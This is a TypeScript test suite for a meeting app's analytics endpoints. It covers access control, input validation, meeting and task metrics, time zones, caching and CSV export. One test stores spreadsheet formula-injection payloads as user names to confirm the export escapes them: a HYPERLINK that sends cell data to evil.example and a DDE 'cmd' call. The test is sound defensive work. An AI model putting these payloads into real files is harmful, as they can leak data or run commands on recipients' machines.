import { beforeEach, describe, expect, it } from 'vitest';
import request from 'supertest';
import { Types } from 'mongoose';
import type {
  AnalyticsMembers,
  AnalyticsOverview,
  AnalyticsWeekly,
  AuthResponse,
  BoardDetail,
} from '@intellmeet/shared';
import { createApp } from '../../app.js';
import { generateCode } from '../../lib/ids.js';
import { defaultBoard, teamWithMember, type BoardTeam } from '../../test/boards.js';
import { bearer, registerUser, type TestUser } from '../../test/fixtures.js';
import { MeetingInsight } from '../ai/insight.model.js';
import { Message } from '../chat/message.model.js';
import { DEMO_TEAM_SLUG } from '../demo/demo.constants.js';
import { Meeting } from '../meetings/meeting.model.js';
import { recordParticipantJoin } from '../meetings/meeting.service.js';
import { Task } from '../tasks/task.model.js';
import { Team } from '../teams/team.model.js';
import { User } from '../users/user.model.js';

const app = createApp();

const ENDPOINTS = ['overview', 'weekly', 'members', 'export'] as const;

/** Four weeks of August 2026, Monday 3rd to Sunday 30th. */
const AUGUST = 'from=2026-08-03&to=2026-08-30';

const at = (iso: string) => new Date(iso);

/**
 * A team with a known month, built straight into the database so every
 * number below can be worked out by hand:
 *
 * | meeting | when (UTC)          | length | people            | counts?                 |
 * |---------|---------------------|--------|-------------------|-------------------------|
 * | M1      | Tue 4 Aug 09:00     | 30 min | Ada, Grace        | yes, week of 3 Aug      |
 * | M2      | Wed 12 Aug 10:00    | 60 min | Ada, Grace x2, Cy | yes, week of 10 Aug     |
 * | M3      | Sun 30 Aug 20:00    | 45 min | Ada               | yes in UTC (24 Aug), not in Kolkata (31 Aug) |
 * | M4      | Wed 5 Aug           | -      | nobody            | no: nobody joined       |
 * | M5      | Thu 6 Aug           | live   | Ada               | no: not ended           |
 * | M6      | Mon 20 Jul          | 30 min | Ada               | no: before the range    |
 * | M7      | Tue 4 Aug           | 30 min | Alan              | no: another team        |
 *
 * Grace rejoined M2 (two attendance rows): one person, both stretches of
 * time. Cy attended M2 but is not in the team (any more).
 */
interface Fixture extends BoardTeam {
  former: TestUser;
  board: BoardDetail;
  otherTeamId: string;
  tasks: { t1: string; t2: string; t3: string };
}

async function meeting(fields: Record<string, unknown>) {
  return Meeting.create({ roomCode: generateCode(7), title: 'A meeting', ...fields });
}

async function backdate(taskId: Types.ObjectId, createdAt: Date) {
  // Through the driver: Mongoose's timestamps would stamp "now".
  await Task.collection.updateOne({ _id: taskId }, { $set: { createdAt } });
}

async function buildFixture(): Promise<Fixture> {
  const team = await teamWithMember(app);
  const { admin: ada, member: grace, outsider: alan } = team;
  const former = await registerUser(app, { name: 'Cy Former' });
  const teamId = new Types.ObjectId(team.teamId);
  const person = (user: TestUser) => new Types.ObjectId(user.id);

  const otherTeam = await Team.create({
    name: 'Elsewhere',
    slug: `elsewhere-${generateCode(5).toLowerCase()}`,
    ownerId: person(alan),
    members: [{ userId: person(alan), role: 'admin' }],
  });

  const m1 = await meeting({
    teamId,
    hostId: person(ada),
    status: 'ended',
    startedAt: at('2026-08-04T09:00:00Z'),
    endedAt: at('2026-08-04T09:30:00Z'),
    participants: [
      {
        userId: person(ada),
        joinedAt: at('2026-08-04T09:00:00Z'),
        leftAt: at('2026-08-04T09:30:00Z'),
      },
      {
        userId: person(grace),
        joinedAt: at('2026-08-04T09:05:00Z'),
        leftAt: at('2026-08-04T09:20:00Z'),
      },
    ],
  });
  const m2 = await meeting({
    teamId,
    hostId: person(grace),
    status: 'ended',
    startedAt: at('2026-08-12T10:00:00Z'),
    endedAt: at('2026-08-12T11:00:00Z'),
    participants: [
      // In the lobby before it started, and never seen to leave: the whole hour.
      { userId: person(ada), joinedAt: at('2026-08-12T09:55:00Z'), leftAt: null },
      {
        userId: person(grace),
        joinedAt: at('2026-08-12T10:00:00Z'),
        leftAt: at('2026-08-12T10:30:00Z'),
      },
      {
        userId: person(grace),
        joinedAt: at('2026-08-12T10:40:00Z'),
        leftAt: at('2026-08-12T11:00:00Z'),
      },
      {
        userId: person(former),
        joinedAt: at('2026-08-12T10:10:00Z'),
        leftAt: at('2026-08-12T10:20:00Z'),
      },
    ],
  });
  await meeting({
    teamId,
    hostId: person(ada),
    status: 'ended',
    startedAt: at('2026-08-30T20:00:00Z'),
    endedAt: at('2026-08-30T20:45:00Z'),
    participants: [{ userId: person(ada), joinedAt: at('2026-08-30T20:00:00Z') }],
  });
  const m4 = await meeting({
    teamId,
    hostId: person(ada),
    status: 'ended',
    startedAt: at('2026-08-05T09:00:00Z'),
    endedAt: at('2026-08-05T09:01:00Z'),
    participants: [],
  });
  await meeting({
    teamId,
    hostId: person(ada),
    status: 'live',
    startedAt: at('2026-08-06T09:00:00Z'),
    participants: [{ userId: person(ada), joinedAt: at('2026-08-06T09:00:00Z') }],
  });
  await meeting({
    teamId,
    hostId: person(ada),
    status: 'ended',
    startedAt: at('2026-07-20T09:00:00Z'),
    endedAt: at('2026-07-20T09:30:00Z'),
    participants: [{ userId: person(ada), joinedAt: at('2026-07-20T09:00:00Z') }],
  });
  await meeting({
    teamId: otherTeam._id,
    hostId: person(alan),
    status: 'ended',
    startedAt: at('2026-08-04T09:00:00Z'),
    endedAt: at('2026-08-04T09:30:00Z'),
    participants: [{ userId: person(alan), joinedAt: at('2026-08-04T09:00:00Z') }],
  });

  const board = await defaultBoard(app, ada, team.teamId);
  const column = (title: string) => {
    const found = board.board.columns.find((entry) => entry.title === title);
    if (!found) throw new Error(`No column ${title}`);
    return new Types.ObjectId(found.id);
  };
  const task = async (fields: Record<string, unknown>, createdAt: Date) => {
    const created = await Task.create({
      boardId: new Types.ObjectId(board.board.id),
      teamId,
      title: 'A task',
      order: 1024,
      createdBy: person(ada),
      ...fields,
    });
    await backdate(created._id, createdAt);
    return created;
  };

  const itemB = new Types.ObjectId();
  const itemF = new Types.ObjectId();
  // T1: item b's task, done. T2: item f's task, still To Do. T3: nobody's, done.
  const t1 = await task(
    {
      columnId: column('Done'),
      assigneeId: person(ada),
      sourceMeetingId: m1._id,
      sourceActionItemId: itemB,
    },
    at('2026-08-04T10:00:00Z'),
  );
  const t2 = await task(
    {
      columnId: column('To Do'),
      assigneeId: person(grace),
      sourceMeetingId: m2._id,
      sourceActionItemId: itemF,
    },
    at('2026-08-12T12:00:00Z'),
  );
  const t3 = await task({ columnId: column('Done'), assigneeId: null }, at('2026-08-20T09:00:00Z'));
  // Created before the range: not counted.
  await task({ columnId: column('Done'), assigneeId: person(grace) }, at('2026-07-01T09:00:00Z'));

  const item = (fields: Record<string, unknown>) => ({
    text: 'Do a thing',
    assigneeName: null,
    assigneeId: null,
    dueDate: null,
    status: 'open',
    taskId: null,
    ...fields,
  });
  await MeetingInsight.create({
    meetingId: m1._id,
    summary: 'M1',
    provider: 'test',
    actionItems: [
      item({ assigneeId: person(grace), status: 'done' }), // a: ticked off
      item({ _id: itemB, assigneeId: person(ada), taskId: t1._id }), // b: its task is done
      item({ assigneeId: person(grace), dueDate: '2020-01-01' }), // c: overdue
    ],
  });
  await MeetingInsight.create({
    meetingId: m2._id,
    summary: 'M2',
    provider: 'test',
    actionItems: [
      item({ assigneeId: person(ada), dueDate: '2099-01-01' }), // d: open, not due
      item({}), // e: open, nobody's
      item({ _id: itemF, assigneeId: person(grace), taskId: t2._id }), // f: task not done
    ],
  });
  // An item in a meeting that does not count is not counted either.
  await MeetingInsight.create({
    meetingId: m4._id,
    summary: 'M4',
    provider: 'test',
    actionItems: [item({ status: 'done', assigneeId: person(ada) })],
  });

  await Message.create([
    { meetingId: m1._id, senderId: person(ada), text: 'one' },
    { meetingId: m1._id, senderId: person(ada), text: 'two' },
    { meetingId: m1._id, senderId: person(grace), text: 'three' },
    { meetingId: m4._id, senderId: person(grace), text: 'in a meeting that does not count' },
  ]);

  return {
    ...team,
    former,
    board,
    otherTeamId: otherTeam._id.toString(),
    tasks: { t1: t1._id.toString(), t2: t2._id.toString(), t3: t3._id.toString() },
  };
}

function get<T>(user: TestUser, endpoint: string, query: string): Promise<T> {
  return request(app)
    .get(`/api/analytics/${endpoint}?${query}`)
    .set('Authorization', bearer(user))
    .expect(200)
    .then((response) => response.body as T);
}

describe('analytics', () => {
  let fx: Fixture;

  beforeEach(async () => {
    fx = await buildFixture();
  });

  describe('who may see what', () => {
    it('requires a session on every endpoint', async () => {
      for (const endpoint of ENDPOINTS) {
        await request(app)
          .get(`/api/analytics/${endpoint}?teamId=${fx.teamId}&dataset=weekly`)
          .expect(401);
      }
    });

    it('answers "not found" on every endpoint for a team the caller is not in', async () => {
      for (const endpoint of ENDPOINTS) {
        const response = await request(app)
          .get(`/api/analytics/${endpoint}?teamId=${fx.teamId}&dataset=members`)
          .set('Authorization', bearer(fx.outsider));
        expect(response.status, endpoint).toBe(404);
        expect(response.body.error.code).toBe('NOT_FOUND');
        // Nothing about the team leaks, not even its name.
        expect(JSON.stringify(response.body)).not.toContain('Grace');
      }
    });

    it('answers the same for a team that does not exist', async () => {
      const response = await request(app)
        .get(`/api/analytics/overview?teamId=${new Types.ObjectId().toString()}`)
        .set('Authorization', bearer(fx.admin));
      expect(response.status).toBe(404);
    });

    it('shows a member only their own team, never a team they are not in', async () => {
      const theirs = await get<AnalyticsOverview>(
        fx.member,
        'overview',
        `teamId=${fx.teamId}&${AUGUST}`,
      );
      expect(theirs.range.teamName).toBeTruthy();

      const response = await request(app)
        .get(`/api/analytics/overview?teamId=${fx.otherTeamId}&${AUGUST}`)
        .set('Authorization', bearer(fx.member));
      expect(response.status).toBe(404);
    });

    it('lets a demo guest see the demo team and nothing else', async () => {
      const persona = new Types.ObjectId();
      await Team.create({
        name: 'IntellMeet Demo Team',
        slug: DEMO_TEAM_SLUG,
        ownerId: persona,
        members: [{ userId: persona, role: 'admin' }],
      });
      const demo = await request(app).post('/api/auth/demo').expect(201);
      const guest = { accessToken: (demo.body as AuthResponse).accessToken };
      const demoTeam = await Team.findOne({ slug: DEMO_TEAM_SLUG });

      for (const endpoint of ENDPOINTS) {
        await request(app)
          .get(`/api/analytics/${endpoint}?teamId=${demoTeam?._id.toString()}&dataset=weekly`)
          .set('Authorization', bearer(guest))
          .expect(200);
        await request(app)
          .get(`/api/analytics/${endpoint}?teamId=${fx.teamId}&dataset=weekly`)
          .set('Authorization', bearer(guest))
          .expect(404);
      }
    });

    it('checks membership on every request, even when the answer is cached', async () => {
      await get(fx.member, 'overview', `teamId=${fx.teamId}&${AUGUST}`);
      await Team.updateOne(
        { _id: fx.teamId },
        { $pull: { members: { userId: new Types.ObjectId(fx.member.id) } } },
      );
      await request(app)
        .get(`/api/analytics/overview?teamId=${fx.teamId}&${AUGUST}`)
        .set('Authorization', bearer(fx.member))
        .expect(404);
    });
  });

  describe('validation', () => {
    it.each([
      ['a malformed team id', 'teamId=nope'],
      ['no team id', AUGUST],
      ['a date that is not a date', `teamId=TEAM&from=2026-13-40`],
      ['a range that runs backwards', `teamId=TEAM&from=2026-08-30&to=2026-08-03`],
      ['a range longer than a year', `teamId=TEAM&from=2024-01-01&to=2026-01-01`],
      ['an unknown time zone', `teamId=TEAM&tz=Mars/Olympus_Mons`],
      ['an offset instead of a zone', `teamId=TEAM&tz=%2B05:30`],
    ])('refuses %s', async (_name, query) => {
      const response = await request(app)
        .get(`/api/analytics/overview?${query.replace('TEAM', fx.teamId)}`)
        .set('Authorization', bearer(fx.admin));
      expect(response.status).toBe(400);
      expect(response.body.error.code).toBe('VALIDATION_ERROR');
    });

    it('refuses a defaulted range that would run backwards', async () => {
      const response = await request(app)
        .get(`/api/analytics/overview?teamId=${fx.teamId}&from=2999-01-01`)
        .set('Authorization', bearer(fx.admin));
      expect(response.status).toBe(400);
    });

    it('refuses an export without a known dataset', async () => {
      for (const dataset of ['', 'everything']) {
        await request(app)
          .get(`/api/analytics/export?teamId=${fx.teamId}&dataset=${dataset}`)
          .set('Authorization', bearer(fx.admin))
          .expect(400);
      }
    });

    it('defaults to the last eight weeks, ending today', async () => {
      const overview = await get<AnalyticsOverview>(fx.admin, 'overview', `teamId=${fx.teamId}`);
      expect(overview.range.tz).toBe('UTC');
      expect(overview.range.to).toBe(new Date().toISOString().slice(0, 10));
      expect(overview.range.weeks).toHaveLength(8);
      expect(overview.range.from).toBe(overview.range.weeks[0]);
    });
  });

  describe('the numbers', () => {
    it('sums up the meetings, action items and tasks of the range', async () => {
      const overview = await get<AnalyticsOverview>(
        fx.admin,
        'overview',
        `teamId=${fx.teamId}&${AUGUST}`,
      );

      expect(overview.range).toMatchObject({
        from: '2026-08-03',
        to: '2026-08-30',
        tz: 'UTC',
        weeks: ['2026-08-03', '2026-08-10', '2026-08-17', '2026-08-24'],
      });
      // M1, M2, M3: 30 + 60 + 45 minutes; 2 + 3 + 1 distinct people.
      expect(overview.meetings).toEqual({
        count: 3,
        totalMinutes: 135,
        averageMinutes: 45,
        averageParticipants: 2,
      });
      // a..f: a ticked off, b's task done; c overdue; d, e, f open.
      expect(overview.actionItems).toEqual({ created: 6, completed: 2, open: 3, overdue: 1 });
      // T1..T3 created in August; T1 and T3 are in "Done".
      expect(overview.tasks).toEqual({ created: 3, completed: 2, completionRate: 0.667 });
    });

    it('buckets by week, empty weeks included', async () => {
      const { weeks } = await get<AnalyticsWeekly>(
        fx.admin,
        'weekly',
        `teamId=${fx.teamId}&${AUGUST}`,
      );
      expect(weeks).toEqual([
        {
          week: '2026-08-03',
          meetings: 1,
          totalMinutes: 30,
          averageMinutes: 30,
          averageParticipants: 2,
          actionItemsCreated: 3,
          actionItemsCompleted: 2,
        },
        {
          week: '2026-08-10',
          meetings: 1,
          totalMinutes: 60,
          averageMinutes: 60,
          averageParticipants: 3,
          actionItemsCreated: 3,
          actionItemsCompleted: 0,
        },
        {
          week: '2026-08-17',
          meetings: 0,
          totalMinutes: 0,
          averageMinutes: null,
          averageParticipants: null,
          actionItemsCreated: 0,
          actionItemsCompleted: 0,
        },
        {
          week: '2026-08-24',
          meetings: 1,
          totalMinutes: 45,
          averageMinutes: 45,
          averageParticipants: 1,
          actionItemsCreated: 0,
          actionItemsCompleted: 0,
        },
      ]);
    });

    it('uses the reader’s time zone for the range and the weeks', async () => {
      // Sunday 30 Aug 20:00 UTC is Monday 31 Aug 01:30 in Kolkata.
      const range = `teamId=${fx.teamId}&from=2026-08-24&to=2026-09-06`;
      const utc = await get<AnalyticsWeekly>(fx.admin, 'weekly', `${range}&tz=UTC`);
      const india = await get<AnalyticsWeekly>(fx.admin, 'weekly', `${range}&tz=Asia/Kolkata`);
      expect(utc.weeks.map((week) => [week.week, week.meetings])).toEqual([
        ['2026-08-24', 1],
        ['2026-08-31', 0],
      ]);
      expect(india.weeks.map((week) => [week.week, week.meetings])).toEqual([
        ['2026-08-24', 0],
        ['2026-08-31', 1],
      ]);

      // And "to 30 Aug" in Kolkata ends before it starts.
      const august = await get<AnalyticsOverview>(
        fx.admin,
        'overview',
        `teamId=${fx.teamId}&${AUGUST}&tz=Asia/Kolkata`,
      );
      expect(august.meetings.count).toBe(2);
    });

    it('ranks the people who took part, with what each of them did', async () => {
      const { members } = await get<AnalyticsMembers>(
        fx.admin,
        'members',
        `teamId=${fx.teamId}&${AUGUST}`,
      );

      expect(members.map((member) => member.name)).toEqual([
        'Ada Lovelace',
        'Grace Hopper',
        'Cy Former',
      ]);
      const [ada, grace, cy] = members;

      expect(ada).toMatchObject({
        userId: fx.admin.id,
        isMember: true,
        meetingsAttended: 3,
        meetingsHosted: 2,
        // 30 + 60 (clipped to the meeting, still there at the end) + 45.
        minutesInMeetings: 135,
        messagesSent: 2,
        actionItemsOwned: 2,
        actionItemsCompleted: 1,
        tasksAssigned: 1,
        tasksCompleted: 1,
        completionRate: 1,
        activity: 6,
      });
      expect(grace).toMatchObject({
        isMember: true,
        // Rejoining M2 is still one meeting, but both stretches count: 15 + 30 + 20.
        meetingsAttended: 2,
        meetingsHosted: 1,
        minutesInMeetings: 65,
        messagesSent: 1,
        actionItemsOwned: 3,
        actionItemsCompleted: 1,
        tasksAssigned: 1,
        tasksCompleted: 0,
        completionRate: 0,
        activity: 5,
      });
      expect(cy).toMatchObject({
        isMember: false,
        meetingsAttended: 1,
        minutesInMeetings: 10,
        tasksAssigned: 0,
        completionRate: null,
        activity: 1,
      });
    });

    it('names a deleted account "Former member" and keeps its numbers', async () => {
      await User.deleteOne({ _id: fx.former.id });
      const { members } = await get<AnalyticsMembers>(
        fx.admin,
        'members',
        `teamId=${fx.teamId}&${AUGUST}`,
      );
      expect(members.at(-1)).toMatchObject({
        name: 'Former member',
        isMember: false,
        meetingsAttended: 1,
      });
    });

    it('counts a task as done by the column’s "done" flag, not its name', async () => {
      const done = fx.board.board.columns.find((column) => column.title === 'Done');
      await request(app)
        .patch(`/api/boards/${fx.board.board.id}/columns/${done?.id}`)
        .set('Authorization', bearer(fx.admin))
        .send({ isDone: false })
        .expect(200);

      const overview = await get<AnalyticsOverview>(
        fx.admin,
        'overview',
        `teamId=${fx.teamId}&${AUGUST}`,
      );
      expect(overview.tasks.completed).toBe(0);
      // Item a is still ticked off; b's task no longer counts as done.
      expect(overview.actionItems.completed).toBe(1);
    });
  });

  describe('caching', () => {
    it('serves a repeat from the cache, and recomputes after a task moves', async () => {
      const query = `teamId=${fx.teamId}&${AUGUST}`;
      const first = await get<AnalyticsOverview>(fx.admin, 'overview', query);
      expect(first.tasks.completed).toBe(2);

      // A change behind the application's back is not seen: this is the cache.
      const done = fx.board.board.columns.find((column) => column.title === 'Done');
      await Task.collection.updateOne(
        { _id: new Types.ObjectId(fx.tasks.t2) },
        { $set: { columnId: new Types.ObjectId(done?.id) } },
      );
      const cached = await get<AnalyticsOverview>(fx.admin, 'overview', query);
      expect(cached.tasks.completed).toBe(2);
      expect(cached.generatedAt).toBe(first.generatedAt);

      // A move through the API is: T2 back to To Do, then into Done.
      const todo = fx.board.board.columns.find((column) => column.title === 'To Do');
      await request(app)
        .post(`/api/tasks/${fx.tasks.t2}/move`)
        .set('Authorization', bearer(fx.member))
        .send({ columnId: todo?.id })
        .expect(200);
      expect((await get<AnalyticsOverview>(fx.admin, 'overview', query)).tasks.completed).toBe(2);

      await request(app)
        .post(`/api/tasks/${fx.tasks.t2}/move`)
        .set('Authorization', bearer(fx.member))
        .send({ columnId: done?.id })
        .expect(200);
      const after = await get<AnalyticsOverview>(fx.admin, 'overview', query);
      expect(after.tasks.completed).toBe(3);
      // Item f's task is done now, so the item counts as completed too.
      expect(after.actionItems.completed).toBe(3);
    });

    it('counts a meeting as soon as it ends, not five minutes later', async () => {
      const query = `teamId=${fx.teamId}`;
      const before = await get<AnalyticsOverview>(fx.admin, 'overview', query);

      const created = await request(app)
        .post('/api/meetings')
        .set('Authorization', bearer(fx.admin))
        .send({ teamId: fx.teamId, title: 'Right now' })
        .expect(201);
      const meetingId = created.body.meeting.id as string;
      await recordParticipantJoin(meetingId, fx.admin.id);
      expect((await get<AnalyticsOverview>(fx.admin, 'overview', query)).meetings.count).toBe(
        before.meetings.count,
      );

      await request(app)
        .post(`/api/meetings/${meetingId}/end`)
        .set('Authorization', bearer(fx.admin))
        .expect(200);
      expect((await get<AnalyticsOverview>(fx.admin, 'overview', query)).meetings.count).toBe(
        before.meetings.count + 1,
      );
    });

    it('recomputes after the host ticks an action item off', async () => {
      const query = `teamId=${fx.teamId}&${AUGUST}`;
      expect(
        (await get<AnalyticsOverview>(fx.admin, 'overview', query)).actionItems.completed,
      ).toBe(2);

      const m2 = await Meeting.findOne({
        teamId: fx.teamId,
        startedAt: at('2026-08-12T10:00:00Z'),
      });
      const insight = await MeetingInsight.findOne({ meetingId: m2?._id }).lean();
      await request(app)
        .patch(`/api/meetings/${m2?._id.toString()}/insight`)
        .set('Authorization', bearer(fx.member)) // Grace hosted M2
        .send({
          actionItems: insight?.actionItems.map((entry) => ({
            id: entry._id.toString(),
            text: entry.text,
            assigneeId: entry.assigneeId?.toString() ?? null,
            assigneeName: null,
            dueDate: entry.dueDate,
            status: 'done',
          })),
        })
        .expect(200);

      expect(
        (await get<AnalyticsOverview>(fx.admin, 'overview', query)).actionItems.completed,
      ).toBe(5);
    });

    it('shows a rename or a departure at once: only the numbers are cached', async () => {
      const query = `teamId=${fx.teamId}&${AUGUST}`;
      const before = await get<AnalyticsMembers>(fx.admin, 'members', query);

      await request(app)
        .patch('/api/users/me')
        .set('Authorization', bearer(fx.member))
        .send({ name: 'Grace Brewster Hopper' })
        .expect(200);
      await Team.updateOne(
        { _id: fx.teamId },
        { $pull: { members: { userId: new Types.ObjectId(fx.member.id) } } },
      );

      const after = await get<AnalyticsMembers>(fx.admin, 'members', query);
      // Same numbers, from the cache...
      expect(after.generatedAt).toBe(before.generatedAt);
      // ...about the person as they are now.
      const grace = after.members.find((entry) => entry.userId === fx.member.id);
      expect(grace).toMatchObject({ name: 'Grace Brewster Hopper', isMember: false, activity: 5 });
    });

    it('keeps each range and time zone apart', async () => {
      const utc = await get<AnalyticsOverview>(
        fx.admin,
        'overview',
        `teamId=${fx.teamId}&${AUGUST}`,
      );
      const india = await get<AnalyticsOverview>(
        fx.admin,
        'overview',
        `teamId=${fx.teamId}&${AUGUST}&tz=Asia/Kolkata`,
      );
      expect(utc.meetings.count).toBe(3);
      expect(india.meetings.count).toBe(2);
    });
  });

  describe('CSV export', () => {
    it('exports the weekly table as a named, spreadsheet-friendly file', async () => {
      const response = await request(app)
        .get(`/api/analytics/export?teamId=${fx.teamId}&${AUGUST}&dataset=weekly`)
        .set('Authorization', bearer(fx.admin))
        .expect(200);

      expect(response.headers['content-type']).toBe('text/csv; charset=utf-8');
      expect(response.headers['cache-control']).toBe('private, no-store');
      const team = await Team.findById(fx.teamId);
      expect(response.headers['content-disposition']).toBe(
        `attachment; filename="intellmeet-${team?.slug}-weekly-2026-08-03-to-2026-08-30.csv"`,
      );

      const text = response.text;
      expect(text.startsWith('\uFEFF')).toBe(true);
      const lines = text.slice(1).trimEnd().split('\r\n');
      expect(lines).toHaveLength(5);
      expect(lines[0]).toBe(
        '"Week starting","Meetings","Meeting minutes","Average minutes","Average participants","Action items raised","Action items completed"',
      );
      expect(lines[1]).toBe('"2026-08-03",1,30,30,2,3,2');
      // An empty week: no average rather than a zero.
      expect(lines[3]).toBe('"2026-08-17",0,0,,,0,0');
    });

    it('defuses member names a spreadsheet would run as formulas', async () => {
      const hostile = {
        [fx.admin.id]: '=HYPERLINK("https://evil.example/?d="&A1,"Click")',
        [fx.member.id]: "+cmd|' /C calc'!A0",
        [fx.former.id]: '  @SUM(1+1)',
      };
      for (const [id, name] of Object.entries(hostile)) {
        // Through the driver, so the leading blanks survive Mongoose's `trim`:
        // the export must cope with whatever is stored.
        await User.collection.updateOne({ _id: new Types.ObjectId(id) }, { $set: { name } });
      }

      const response = await request(app)
        .get(`/api/analytics/export?teamId=${fx.teamId}&${AUGUST}&dataset=members`)
        .set('Authorization', bearer(fx.admin))
        .expect(200);
      const lines = response.text.slice(1).trimEnd().split('\r\n');

      expect(lines[0]?.startsWith('"Member","Current member","Meetings attended"')).toBe(true);
      expect(lines[1]).toBe(
        '"\'=HYPERLINK(""https://evil.example/?d=""&A1,""Click"")","yes",3,2,135,2,2,1,1,1,100,6',
      );
      expect(lines[2]?.startsWith('"\'+cmd|\' /C calc\'!A0","yes",')).toBe(true);
      expect(lines[3]?.startsWith('"\'  @SUM(1+1)","no",')).toBe(true);
      // Whatever a cell holds, none opens with a formula character.
      for (const line of lines) expect(line).not.toMatch(/^"?[=+\-@]/);
    });
  });
});
